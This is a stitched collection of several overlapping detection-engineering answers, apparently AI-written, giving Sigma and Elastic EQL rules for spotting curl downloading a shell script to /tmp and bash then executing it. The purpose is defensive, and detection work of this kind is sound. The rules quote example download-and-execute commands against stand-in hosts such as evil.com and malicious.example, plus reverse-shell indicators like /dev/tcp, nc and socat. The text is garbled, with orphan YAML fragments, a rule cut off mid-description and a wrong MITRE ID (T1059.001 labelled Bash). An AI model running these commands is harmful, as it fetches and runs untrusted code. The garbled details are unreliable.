falsepositives:
  - Legitimate software installers
  - Administrative automation scripts
  - CI/CD pipelines downloading setup scripts
level: low
```

### Sigma rule 2: bash executes shell script from `/tmp`

```yaml

id: 8b6d1a74-35f7-4851-8d42-3e7f32d8c532
description: |
  Detects bash or other common shells executing a .sh script from /tmp.
status: experimental
author: Detection Engineering
date: 2026-01-01
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command-and-scripting-interpreter
  - attack.t1059.004
logsource:
  product: linux
  service: process_creation
  category: process_creation
detection:
  selection_image:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
  selection_command:
    CommandLine|re:
      - "(?i)\\b(bash|sh|dash|zsh)\\b.*[\"']?/tmp/[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
  condition: selection_image and selection_command
falsepositives:
  - Administrative maintenance scripts
  - Temporary scripts generated by applications
  - Installer or patching workflows
level: low
```

  timeframe: 1m
  group_by:
    - host.name

  - host.name
  - Image
  - CommandLine
  - Process_guid

```

> Note: Sigma temporal correlation support varies by SIEM. If your platform does not natively support correlation, use the two Sigma rules above and create the temporal correlation in your SIEM query language.

---

## 4. Optional companion rule: direct `curl | bash`

The main rule above focuses on the requested `/tmp` download-and-execute pattern. Many malware samples use the even more direct pattern:

```bash
curl http://example.com/payload.sh | bash
```

You can add this companion EQL rule to cover that variant:

```eql
[process where event.category == "process" and event.action != "end"
  and (
    process.name == "bash"
    or process.name == "sh"
    or process.name == "dash"
    or process.name == "zsh"
  )
  and process.command_line ~ "(?i)\\b(curl|wget)\\b.*\\|\\s*(bash|sh)\\b"
]
```

---

## 5. Tuning guidance

### Time window

The rule uses:

```eql
sequence by host.name with maxspan=1m
```

You can adjust this based on your environment:

- `30s`: lower false positives, higher chance of missing slow downloads.
- `1m`: balanced.
- `5m`: better for slow networks or large downloads, but more false positives.

### File path scope

The rule currently monitors:

```text
/tmp
```

Malware also commonly uses:

```text
/var/tmp
/dev/shm
/home/<user>/tmp
```

To broaden detection, replace `/tmp/` with:

```eql
(?:/tmp/|/var/tmp/|/dev/shm/)
```

For example:

```eql
process.command_line ~ "(?i)(-o[\\s=]*|--output[\\s=]*|>\\s*)[\"']?(?:/tmp/|/var/tmp/|/dev/shm/)[^\\s\"']+\\.sh(?:[\\s\"';&|>]|$)"
```

### Script extension

The rule requires:

```text
.sh
```

If scripts commonly lack extensions, remove the `.sh` requirement:

```eql
/tmp/[^\\s\"']+
```

For example:

```eql
process.command_line ~ "(?i)(-o[\\s=]*|--output[\\s=]*|>\\s*)[\"']?/tmp/[^\\s\"']+(?:[\\s\"';&|>]|$)"
```

This increases detection coverage but also false positives.

### Legitimate installers

Common false positives include administrative scripts such as:

```bash
curl https://releases.example.com/tool/install.sh -o /tmp/install.sh
bash /tmp/install.sh
```

To tune:

1. Allow known trusted download domains.
2. Require suspicious destination indicators.
3. Hash the created script file.
4. Check process lineage.
5. Allow expected parent processes for authorized workflows.

Example parent/process exclusions if your data source supports them:

```eql
not (
  process.parent.name in ("apt", "dpkg", "dnf", "yum", "zypper", "snap", "flatpak")
  or process.command_line ~ "(?i)(apt-get|dnf|yum|zypper|snap|flatpak)"
)
```

Use exclusions carefully to avoid blinding the rule.

---

## 6. Safe validation example

You can validate the rule using a harmless sequence that does not download from the internet:

```bash
curl file:///etc/hostname -o /tmp/eql-test.sh
bash -n /tmp/eql-test.sh
```

`bash -n` checks syntax without executing commands, so this should still produce process events and trigger the detection pattern.

Alternatively:

```bash
curl file:///etc/hostname -o /tmp/eql-test.sh
bash /tmp/eql-test.sh
```

This may produce shell errors depending on the file contents, but it demonstrates the intended behavior.

---

## 7. MITRE ATT&CK mapping

| Technique | ID | Description |
|---|---:|---|
| Ingress Tool Transfer | `T1105` | `curl` downloads remote content |
| Command and Scripting Interpreter: Unix Shell | `T1059.004` | `bash` executes the downloaded script |

---

## 8. Summary of detection logic

The rule detects this chain:

```text
curl writes/downloads /tmp/*.sh
        |
        v
bash executes /tmp/*.sh
```

It captures common malware delivery behavior while remaining tunable for false positives.

Below is a practical detection rule you can adapt to Linux process-creation telemetry, such as Sysmon for Linux, Falco, Elastic, Splunk, or similar tools. The core idea is:

```text
curl writes/downloads a shell script into /tmp
  AND
bash/sh/dash executes a script from /tmp
  within a short time window
```

A classic malicious example would be:

```bash
curl https://example[.]com/patch.sh -o /tmp/patch.sh && bash /tmp/patch.sh
```

or:

```bash
bash -c 'curl https://example[.]com/update.sh --output /tmp/update.sh && /bin/bash /tmp/update.sh'
```

## Recommended Sigma-style detection rule

```yaml
title: Malicious File Download and Execution via curl Writing Bash Script to /tmp
description: >
  Detects a curl process downloading or writing a shell script into /tmp,
  followed by a bash/sh/dash process executing a script from /tmp.
  This is a common Linux malware delivery pattern, often mapped to
  ingress tool transfer plus command-and-scripting-interpreter execution.

author: Security
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
  - https://attack.mitre.org/techniques/T1059.006/

status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection_curl_download:
    Image|endswith:
      - '/curl'
      - '/bin/curl'
      - '/usr/bin/curl'
      - '/usr/local/bin/curl'
    CommandLine|re:
      - 'curl\b.*(?:-o|--output)\s+(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
      - 'curl\b.*>\s*(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'

  selection_bash_execution:
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/sh'
      - '/bin/sh'
      - '/usr/bin/sh'
      - '/dash'
      - '/zsh'
    CommandLine|re:
      - '(?:bash|sh|dash|zsh)\b.*\s(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
      - 'source\b.*\s(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'

  timeframe: 5m
  condition: selection_curl_download | followed_by selection_bash_execution by host.name equals host.name and user.name equals user.name

falsepositives:
  - Legitimate software installers that download scripts to /tmp and execute them.
  - Developer, CI/CD, automation, or provisioning scripts.
  - Security testing, pentesting, or red-team tooling.
  - Package manager helper scripts, update scripts, or deployment wrappers.

level: high

tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
  - attack.t1059.006
```

## More precise variant if your SIEM/EDR can extract the script path

The rule above is broad: it correlates any `/tmp` shell-script download with any `/tmp` shell-script execution on the same host/user within 5 minutes. To reduce false positives, correlate by the exact script path when possible.

Example:

```yaml
title: Malicious File Download and Execution via curl Writing Bash Script to /tmp
description: >
  Detects curl writing a shell script into /tmp followed by execution of the same script path by bash/sh/dash.
  Requires a field such as script_path extracted from the command line or file events.

author: Security
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
  - https://attack.mitre.org/techniques/T1059.006/

status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection_curl_download:
    Image|endswith:
      - '/curl'
      - '/bin/curl'
      - '/usr/bin/curl'
      - '/usr/local/bin/curl'
    script_path|startswith: '/tmp/'
    script_path|endswith:
      - '.sh'
      - '.bash'
      - '.zsh'
    CommandLine|re:
      - 'curl\b.*(?:-o|--output)\s+(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
      - 'curl\b.*>\s*(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'

  selection_bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
    script_path|startswith: '/tmp/'
    script_path|endswith:
      - '.sh'
      - '.bash'
      - '.zsh'
    CommandLine|re:
      - '(?:bash|sh|dash|zsh)\b.*\s(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
      - 'source\b.*\s(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'

  fields:
    - script_path
    - host.name
    - user.name

  timeframe: 5m
  condition: selection_curl_download | followed_by selection_bash_execution by host.name equals host.name and user.name equals user.name and script_path equals script_path

falsepositives:
  - Legitimate installers and update scripts.
  - Developer/CI automation.
  - Security tooling.

level: high

tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
  - attack.t1059.006
```

If your log source does not already provide `script_path`, add an extraction rule or regex field mapping in your SIEM. For example, extract the first match of:

```regex
/tmp/[^ \t\n]+\.(?:sh|bash|zsh)
```

from `CommandLine`, or use file creation/access telemetry if available.

## Simpler single-event detection for one-liner payloads

If your environment does not support correlation, you can still detect many common wrapper commands where a shell executes both the `curl` download and the script in one process command line:

```bash
bash -c 'curl https://example.com/x.sh -o /tmp/x.sh && bash /tmp/x.sh'
sh -c 'curl https://example.com/x.sh --output /tmp/x.sh && sh /tmp/x.sh'
```

Sigma example:

```yaml
title: Curl Download and Bash Execution in Same Command Line
description: >
  Detects one-line commands where curl downloads a shell script to /tmp
  and bash/sh/dash executes a script from /tmp.

status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection_chain:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'

  timeframe: 0m
  condition: selection_chain

falsepositives:
  - Software installers
  - Automation scripts
  - Developer tooling

level: medium

tags:
  - attack.execution
  - attack.t1105
  - attack.t1059.004
```

This is less precise but often useful for detecting malware that uses compact `bash -c` or `sh -c` download-and-run commands.

## If you have file-creation telemetry

If your EDR/Sysmon environment logs file writes, you can correlate curl creating a file with bash executing or reading that file. This can be cleaner because it does not rely only on command-line parsing.

Preferred logic:

```text
ProcessCreate / FileCreate:
  Image endswith /curl
  TargetFilename startswith /tmp/
  TargetFilename endswith .sh, .bash, or .zsh

followed by:

ProcessCreate / FileAccess:
  Image endswith /bash, /sh, /dash
  TargetFilename startswith /tmp/
  TargetFilename endswith .sh, .bash, or .zsh
```

If your platform exposes the file path in both events, group by the exact `TargetFilename`.

---

## Sysmon configuration note

For the correlation rule to work reliably on Linux using Sysmon, ensure process creation events are enabled and ideally file creation events are enabled.

Example Sysmon config snippet:

```xml
<Sysmon>
  <ProcessCreate>1</ProcessCreate>
  <FileCreate>1</FileCreate>
</Sysmon>
```

If file creation events are enabled, the detection can be made stronger by correlating:

```text
EventID 11: curl writes /tmp/malicious.sh
  followed by
EventID 1: bash executes /tmp/malicious.sh
```

## Tuning recommendations

To reduce noise:

1. **Correlate by exact script path** when possible.
2. **Inspect parent process lineage.**
   - Suspicious: `bash -> curl -> bash`
   - Less suspicious: `systemd -> service -> installer.sh -> curl -> bash`
3. **Look for suspicious URLs or hosts.**
   - Public paste services
   - Newly registered domains
   - IP-address URLs
   - Dynamic DNS domains
   - TLS without certificate validation
   - Redirect chains from known C2 infrastructure
4. **Check the script contents.**
   - Obfuscated bash
   - `base64 -d`
   - `eval`
   - `/dev/tcp`
   - Reverse shell patterns
   - `python -c`, `perl -e`, `nc`, `socat`
5. **Avoid blocking based only on `/tmp`** because `/tmp` is heavily used by legitimate software.
6. **Increase the time window** if the script is executed after a delay.
   - Default: `5m`
   - If the malware sleeps before execution, try `30m` to `1h`, but tune for false positives.
7. **Allowlist known good URLs, file hashes, certificates, or installer paths.**
   - For example, a known update service downloading to `/tmp/update.sh` may be benign.
   - Use hash reputation and file provenance before alerting.

## Optional broader coverage: add wget

If you want to detect `wget` download-and-execution too, extend the download selector:

```yaml
  selection_download:
    Image|endswith:
      - '/curl'
      - '/wget'
    CommandLine|re:
      - '(?:curl|wget)\b.*(?:-o|--output|-O|--output-document)\s+(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
      - '(?:curl|wget)\b.*>\s*(/tmp/[^ \t\n]+\.(?:sh|bash|zsh))'
```

Example malicious pattern:

```bash
wget https://example.com/setup.sh -O /tmp/setup.sh && bash /tmp/setup.sh
```

text:
Below is a practical, Linux-oriented detection rule set written in Sigma-style. It implements the core detection idea:

> **A `curl` process writes/downloads a Bash script into `/tmp`, and shortly afterward a `bash` process executes a script from `/tmp`.**

Because this is a **sequence / correlation** pattern, it is best implemented as either:

- a Sigma correlation rule, or
- an SIEM-native sequence rule.

---

## Recommended detection logic

### Correlation condition

Alert when **both** of the following occur **on the same host** in order, within a short time window such as 10–30 seconds:

1. **Download / write stage**
   - Process is `curl`
   - Command line contains an output redirection or output flag that writes a `.sh` file to `/tmp/`
   - Examples:
     - `curl ... -o /tmp/payload.sh ...`
     - `curl ... --output /tmp/payload.sh ...`
     - `curl ... --output=/tmp/payload.sh ...`
     - `curl ... > /tmp/payload.sh`
     - `curl ... >> /tmp/payload.sh`

2. **Execution stage**
   - Process is `bash`
   - Command line executes a `.sh` script located in `/tmp/`
   - Examples:
     - `bash /tmp/payload.sh`
     - `/bin/bash /tmp/payload.sh`
     - `bash -c /tmp/payload.sh`

---

## Sigma-style rule set

Use this as three linked rules if your Sigma implementation supports correlation rules.

### Rule 1 — `curl` download/write of `/tmp` Bash script

```yaml
title: Linux Curl Downloads Bash Script to /tmp
id: 7b31e33e-13e2-4a15-b90a-1f7d8639c85e
status: experimental
description: >
  Detects a curl process writing or downloading an executable Bash script into /tmp
  using output flags such as -o or --output, or shell redirection such as > /tmp/*.sh.
references:
  - https://attack.mitre.org/techniques/T1105/
author: detection-engineering
date: 2026-02-15
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'

  selection_output_flag:
    CommandLine|re: '(?:-o|--output)(?:\s+|\s*=\s*)\s*["'']?/tmp/\S+\.sh'

  selection_redirect:
    CommandLine|re: '(?:>|>>)\s*["'']?/tmp/\S+\.sh'

  condition: selection_image and (selection_output_flag or selection_redirect)

falsepositives:
  - Legitimate software installers
  - Update mechanisms or patch scripts
  - Docker / container initialization scripts
  - Authorized administrative remediation scripts

level: medium
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1105
  - attack.t1059.004
```

---

### Rule 2 — `bash` execution of `/tmp` script

```yaml
title: Linux Bash Executes Script from /tmp
id: 5361729c-6b9b-48d8-a7f1-0b5d9d9f5f6d
status: experimental
description: >
  Detects execution of a Bash script that resides in /tmp/.
  This rule should be used together with a prior download/write event for higher fidelity.
references:
  - https://attack.mitre.org/techniques/T1059/
author: detection-engineering
date: 2026-02-15
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'

  selection_script:
    CommandLine|re: '(?:^|\s)(?:/usr/bin/bash|/bin/bash|bash)(?:\s+-[a-zA-Z]+)*\s+["'']?/tmp/\S+\.sh(?:\s|$)'

  condition: selection_image and selection_script

falsepositives:
  - Legitimate scripts stored or updated in /tmp during installation or maintenance
  - Temporary administrative scripts
  - Software installers executing generated scripts

level: medium
tags:
  - attack.execution
  - attack.t1059.004
```

---

### Rule 3 — Correlation rule: `curl /tmp script -> bash /tmp script`

```yaml
title: Malicious Download-and-Execute via curl /tmp Script Followed by bash
id: 2e9a2f57-1b5c-41f5-93b1-843f2c5a635d
status: experimental
description: >
  Detects a classic download-and-execution malware delivery pattern:

## Important implementation notes

### 1. Field names may need adaptation
Depending on your data source, rename the fields to match your normalizations:

- **Sysmon for Linux**:
  - `Image`
  - `CommandLine`
  - `Computer`
- **Elastic ECS / EDR telemetry**:
  - `process.name`
  - `process.command_line` or `process.args`
  - `host.name` / `host.id`
- **Splunk / Sentinel / Chronicle / etc.**:
  - map `Image` and `CommandLine` to your ingested process fields

If you use `process.name` instead of `Image`, the rule is logically the same.

---

### 2. Timeframe tuning
A 30-second correlation window is reasonable. You can tighten it to:

- **10–15 seconds** for lower false positives
- **60 seconds** if some environments show delayed execution due to chaining, sleep, or wrapper processes

The key is that the correlation must be:
- **ordered**: `curl` event before `bash` event
- **same-host**: not just same event category

---

### 3. Why this is better than a single `bash /tmp/*.sh` rule
If you only alert on:

```text
bash /tmp/*.sh
```

you will generate many false positives from:
- legitimate installers
- patching scripts
- maintenance jobs
- Docker/cloud-init automation

By requiring a preceding `curl` download/write to `/tmp`, you get much better fidelity for the classic:

```text
curl -o /tmp/x.sh https://evil.com/x.sh && bash /tmp/x.sh
```

or:

```text
curl https://evil.com/x.sh > /tmp/x.sh && bash /tmp/x.sh
```

---

## If your SIEM does not support Sigma correlation directly

Implement it as a native sequence/search rule.

### Generic sequence logic

```text
Sequence by host with maxspan=30s and ordered=true:

Event 1:
  process.name == "curl"
  AND command line matches:
    - output flag writing to /tmp/*.sh
      regex: (?:-o|--output)(?:\s+|\s*=\s*)\s*["']?/tmp/\S+\.sh
    - OR redirection to /tmp/*.sh
      regex: (?:>|>>)\s*["']?/tmp/\S+\.sh

Event 2:
  process.name == "bash"
  AND command line matches:
    (?:^|\s)(?:/usr/bin/bash|/bin/bash|bash)(?:\s+-[a-zA-Z]+)*\s+["']?/tmp/\S+\.sh
```

---

## Optional higher-fidelity improvement: match exact script path

The current rule correlates:
- any `curl` writing **some** `/tmp/*.sh`
- followed by any `bash` executing **some** `/tmp/*.sh`

This is already effective.

For even better fidelity, if your SIEM supports field capture or path matching, correlate the **exact filename**:

- from the `curl` output argument
- to the `bash` script path

For example:

```text
curl -o /tmp/payload.sh https://evil.example/payload.sh
bash /tmp/payload.sh
```

This reduces false positives where:
- one script is downloaded, and
- another unrelated `/tmp` script is executed.

If your platform supports file events, this is also a strong alternative:

- `FileCreated` by `curl` to `/tmp/*.sh`
- followed by `bash` execution of the same file path

---

## Summary of what the rule detects

A typical malicious sequence covered by this rule:

```bash
curl -o /tmp/updater.sh https://malicious.example/updater.sh
bash /tmp/updater.sh
```

or:

```bash
curl https://malicious.example/updater.sh > /tmp/updater.sh
bash /tmp/updater.sh
```

or:

```bash
curl --output /tmp/updater.sh https://malicious.example/updater.sh && bash /tmp/updater.sh
```

text:
## Detection Rule: Curl Downloads Bash Script to /tmp, Then Bash Executes It

This is best implemented as a **sequence/correlation rule** on Linux endpoints or SIEM/EDR telemetry, because the behavior spans two actions:

1. `curl` downloads/writes a `.sh` file under `/tmp`.
2. A shell interpreter later executes a script from `/tmp`.

This pattern strongly maps to malware delivery:

- **T1105** – Ingress Tool Transfer  
- **T1059.004** – Command and Scripting Interpreter: Unix Shell  
- Classic **download-and-execute** behavior

---

## Portable Sequence / Correlation Rule

```yaml
# Detection rule: curl download to /tmp followed by bash execution
# Platform: Linux
# Rule type: sequence / correlation
# Source telemetry: process_creation, file_event

detection_rule:
  id: curl-download-to-tmp-then-bash-execution
  name: Curl Downloads Bash Script to /tmp Followed by Bash Execution
  description: >
    Detects malicious Linux download-and-execute behavior where curl downloads or
    writes a bash/shell script into /tmp, followed by execution of that script by
    bash, sh, zsh, dash, or ksh.
  severity: high
  mitre:
    techniques:
      - T1105
      - T1059.004
  platform: linux
  timeframe: 1h
  group_by:
    - host.name
    - user.name
    - process.session.id   # optional, if available

  events:
    curl_download:
      logsource:
        product: linux
        categories:
          - process_creation
          - file_event
      condition:
        any:
          # Option 1: curl command-line writes a .sh file under /tmp
          - process.name == "curl"
            process.command_line matches regex_download

          # Option 2: curl creates/downloads a .sh file under /tmp
          - process.name == "curl"
            file.path startswith "/tmp/"
            file.path endswith ".sh"

          # Option 3: curl writes an executable file under /tmp with .sh extension
          - process.name == "curl"
            file.path startswith "/tmp/"
            file.path endswith ".sh"
            file.permissions contains "x"

    bash_execution:
      logsource:
        product: linux
        category: process_creation
      condition:
        any:
          # Bash/sh/zsh/dash/ksh executes a script path under /tmp
          - process.name in ["bash", "sh", "zsh", "dash", "ksh"]
            process.command_line matches regex_execution

          # Direct execution of a script downloaded to /tmp
          - process.executable startswith "/tmp/"
            process.executable endswith ".sh"

          # Shell executes a .sh file after changing into /tmp
          - process.name in ["bash", "sh", "zsh", "dash", "ksh"]
            process.cwd startswith "/tmp/"
            process.command_line matches regex_relative_sh

  sequence:
    first: curl_download
    then: bash_execution
    window: 1h
    match_by:
      - host.name
      - user.name

  regexes:
    regex_download: "(?:-o\\s*|--output\\s*=?\\s*)/tmp/[^\\s]+\\.sh\\b"
    regex_execution: "(?:^|\\s)(?:-c\\s+)?[\"]?/tmp/[^\\s\"]+\\.sh\\b"
    regex_relative_sh: "(?:^|\\s)(?:-c\\s+)?[\"']?\\.?/[^\\s\"']+\\.sh(?:[\\s]|$)"

  false_positives:
    - Legitimate software installers
    - CI/CD build scripts
    - Update scripts
    - Package-manager hooks
    - Admin automation using /tmp
  tuning_guidance:
    - Shorten timeframe to 5-30 minutes to reduce noise
    - Suppress known-signed installer processes
    - Suppress allowed users such as package-manager or build service accounts
    - Alert with higher confidence if:
        - the downloaded file is new in /tmp
        - curl made an outbound network connection shortly before
        - the executed script performs additional suspicious behavior
```

## Elastic EQL Sequence Rule

This implementation detects the behavior using a process-only sequence. If your platform emits file events from curl, use the file-event variant after this.

```sql
sequence by host.name, user.name with maxspan=1h
  [process where event.action == "start"
   and (
     process.name : "curl"
     or process.executable : "*/bin/curl"
   )
   and (
     process.command_line : "*-o /tmp/*.sh*"
     or process.command_line : "*--output /tmp/*.sh*"
     or process.command_line : "*--output=/tmp/*.sh*"
     or process.command_line : "*> /tmp/*.sh*"
   )
  ] as curl_download
  [process where event.action == "start"
   and (
     process.name : "bash"
     or process.name : "sh"
     or process.name : "zsh"
     or process.name : "dash"
     or process.name : "ksh"
     or process.executable : "*/bin/bash"
     or process.executable : "*/bin/sh"
     or process.executable : "/tmp/*.sh"
   )
   and (
     process.command_line : "*tmp/*.sh*"
     or process.executable : "/tmp/*.sh"
   )
  ] as bash_execution
```

Notes:

- `event.action == "start"` may be `process_start`, `create`, or similar depending on your ECS mapping.
- EQL wildcard matching depends on your Elasticsearch/EQL version and field mapping. Adjust patterns if exact keyword matching is required.
- This query detects the common `curl -o /tmp/file.sh` followed by `bash /tmp/file.sh` pattern.

## Elastic EQL Sequence Variant Using Curl File Creation

If file-write telemetry is available, use this variant for better coverage when curl writes the script without exposing the full target path in the process command line.

```sql
sequence by host.name with maxspan=1h
  [file where event.action != "access"
   and process.name : "curl"
   and file.path : "/tmp/*.sh"
  ] as curl_download_file
  [process where event.action == "start"
   and (
     process.name : "bash"
     or process.name : "sh"
     or process.name : "zsh"
     or process.name : "dash"
     or process.name : "ksh"
     or process.executable : "*/bin/bash"
     or process.executable : "*/bin/sh"
     or process.executable : "/tmp/*.sh"
   )
   and (
     process.command_line : "*tmp/*.sh*"
     or process.executable : "/tmp/*.sh"
   )
  ] as script_execution
```

# Recommended Alert Threshold and Tuning

Initial recommended setting:

```text
Alert when:
  curl_download occurs
  followed by bash_execution
  within 30 minutes
  by the same host and user
```

If too many false positives appear, tighten:

```text
timeframe: 5m
group_by: host.name, user.name, process.session.id
only_alert_when:
  - curl made an outbound network connection
  - executed file was created within the last few minutes
  - process is not in an allowed software path, user, or parent tree
```

Suppress common benign sources such as:

```text
/usr/bin/apt
/usr/bin/dnf
/usr/bin/yum
/usr/bin/snap
/opt/*
/usr/local/bin/*
/usr/sbin/service
/usr/bin/crontab
known build-service users
```

text:
## Detection Rule: Malicious `curl` Download of `/tmp` Bash Script Followed by Execution

A robust detection for this pattern requires correlating **two separate process events**:

1. A `curl` process writes/downloads a Bash script into `/tmp`  
   - typically via `-o` or `--output`
2. A `bash` process executes a `.sh` script from `/tmp`  
   - within a short time window, usually 1–5 minutes

Below are platform-ready examples.

---

## Elastic EQL Correlation Rule

This is the best format for “followed by” detection logic.

```eql
// Rule: Malicious curl download of Bash script to /tmp followed by bash execution
// MITRE ATT&CK: T1105 Ingress Tool Transfer, T1059.001 Bash/Shell

sequence by host.id with maxspan=5m [
  process where process.name == "curl" and
    process.command_line != null and
    process.command_line =~ ".*(-o|--output).*?/tmp/[^ ]+\\.sh.*"
][
  process where process.name == "bash" and
    process.command_line != null and
    process.command_line =~ ".*(/tmp/[^ ]+\\.sh).*"
]
```

### Optional: Include `wget` as well

Many malware variants use `wget`. To broaden the rule, replace:

```eql
process.name == "curl"
```

with:

```eql
process.name : ("curl", "wget")
```

### Optional: Include other shell executors

If you want to detect generic shell execution:

```eql
process.name : ("bash", "sh", "dash", "zsh")
```

---

## Optional One-Liner Variant: `curl | bash`

Some malware does not write a file to `/tmp` but pipes directly into a shell. This can be detected as a separate rule:

```eql
// Rule: curl piped directly into bash/sh, download-and-execute without staging file
process where process.name == "bash" and
  process.command_line != null and
  process.command_line =~ ".*curl.*http.*\\|.*bash.*"
```

or, if you want to include `wget`:

```eql
process where process.name == "bash" and
  process.command_line != null and
  process.command_line =~ ".*(curl|wget).*http.*\\|.*(bash|sh).*"
```

---

## Sigma Rule Translation for Linux Process Events

If your SIEM uses Sigma, detection usually requires **two child rules plus a temporal correlation rule**, because the pattern spans multiple process events.

---

### Sigma Rule 1: Curl Downloads Bash Script to `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
id: 3d6f6b5a-6f3b-4b2c-93e3-59f35a8e5a72
status: experimental
description: >
  Detects curl downloading or writing a Bash script into /tmp using output flags
  such as -o or --output. This is often an indicator of ingress tool transfer or
  malware staging.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/001/
author: SOC
tags:
  - attack.command-and-scripting-interpreter
  - attack.command-and-scripting-interpreter.bash-shell
  - attack.ingress-tool-transfer
logsource:
  product: linux
  category: process_creation
  service: auditd
detection:
  selection:
    Image|endswith:
      - '/curl'
      # Optional broadening:
      # - '/wget'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - ' -o'
      - '--output'
      - '-o='
      - '--output='
  condition: selection
falsepositives:
  - Legitimate software installers
  - Administrative scripts
  - Build or packaging tools
  - CI/CD tools staging scripts in /tmp
level: medium
```

---

### Sigma Rule 2: Bash Executes Script from `/tmp`

```yaml
title: Bash Executes Shell Script from /tmp
id: 9a397729-5c18-435a-8d76-124d39e99b91
status: experimental
description: >
  Detects bash executing a Shell script stored in /tmp. Malicious download-and-execute
  malware frequently stores payloads in world-writable temporary directories before
  executing them.
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: SOC
tags:
  - attack.command-and-scripting-interpreter
  - attack.command-and-scripting-interpreter.bash-shell
logsource:
  product: linux
  category: process_creation
  service: auditd
detection:
  selection_absolute_path:
    Image|endswith:
      - '/bash'
      # Optional broadening:
      # - '/sh'
      # - '/dash'
      # - '/zsh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  selection_relative_path_cwd:
    Image|endswith:
      - '/bash'
      # Optional broadening:
      # - '/sh'
      # - '/dash'
      # - '/zsh'
    CommandLine|contains:
      - '.sh'
    CWD|startswith:
      - '/tmp/'
      - '/tmp'
  condition: selection_absolute_path or selection_relative_path_cwd
falsepositives:
  - Admin scripts
  - Temporary deployment scripts
  - Software installers
  - Build tooling
level: medium
```

> Note: Remove `selection_relative_path_cwd` if your log source does not emit `CWD`.

---

### Sigma Correlation Rule

```yaml
ruletype: correlation
title: Malicious Curl Download of Bash Script to /tmp Followed by Bash Execution
id: 1196c1a8-2719-4d0f-8f3e-5d2a3f5d4c9a
status: experimental
description: >
  Detects a temporal sequence where curl downloads a Bash script into /tmp and bash
  executes a script from /tmp within a short window. This behavior is consistent with
  classic Linux malware delivery using ingress tool transfer and Bash execution.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/001/
author: SOC
tags:
  - attack.command-and-scripting-interpreter
  - attack.command-and-scripting-interpreter.bash-shell
  - attack.ingress-tool-transfer
logsource:
  product: linux
  category: process_creation
  service: auditd
correlation:
  type: sequence
  rules:
    - 3d6f6b5a-6f3b-4b2c-93e3-59f35a8e5a72
    - 9a397729-5c18-435a-8d76-124d39e99b91
  group-by:
    - host.id
  timespan: 5m
```

For higher fidelity, if your correlation engine supports field comparison, extract the exact file path from both events and require that they match:

```text
/tmp/<filename>.sh
```

Without exact path correlation, the rule will still detect download-and-execute behavior on the same host, but will be more prone to false positives.

---

## Tuning Notes

### Time Window
Start with:

```text
5 minutes
```

Depending on environment:

- `1 minute`: higher fidelity, fewer false positives
- `15 minutes`: catches slower malware or delayed execution

### Reduce False Positives

Consider filtering or allowing known benign paths/parents such as:

- `/tmp/systemd-private-*`
- `/tmp/ansible-*`
- `/tmp/pip-*`
- `/tmp/tmp*`
- known admin or CI/CD users
- signed package manager processes
- `/var/tmp/` equivalents if you want broader coverage

### Field Adaptation

If your SIEM uses different field names, map them:

| Concept | Common Field Names |
|---|---|
| Process name | `Image`, `process.name`, `ProcessName`, `FileName` |
| Command line | `CommandLine`, `process.command_line`, `ProcessCommandLine` |
| Host | `host.id`, `Computer`, `MachineName`, `DeviceId` |
| Current directory | `CWD`, `current_directory`, `process.cwd` |

text:
Below is a portable **Sigma-style detection rule** for Linux that detects the classic `curl -> /tmp/*.sh -> bash` malware delivery pattern.

This rule is written as a **correlation rule** because the behavior is inherently two steps:

1. `curl` creates/writes a Bash script under `/tmp`
2. `bash` or another shell later executes a `.sh` file from `/tmp`

If your platform does not support correlation rules, I’ve also included a single-event command-line variant below it.

---

## Primary rule: curl writes bash script to /tmp, then bash executes it

```yaml
title: Curl Downloads Bash Script to /tmp Followed by Bash Execution
description: >
  Detects when a curl process writes a .sh script into /tmp (or /var/tmp or /dev/shm)
  and a bash process later executes a .sh script from the same temporary path.
  This correlates classic malware download-and-execute behavior.

status: experimental

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/

author: Detection Engineering
date: 2025-10-26

type: correlation

logsource:
  product: linux

timeframe: 5m

subrules:
  curl_download_bash_script_to_tmp:
    title: Curl Writes Bash Script to Temporary Path
    logsource:
      product: linux
      category: file_event
    detection:
      selection:
        Image|endswith:
          - '/curl'
        TargetFilename|startswith:
          - '/tmp/'
          - '/var/tmp/'
          - '/dev/shm/'
        TargetFilename|endswith:
          - '.sh'
      condition: selection
    fields:
      - TargetFilename

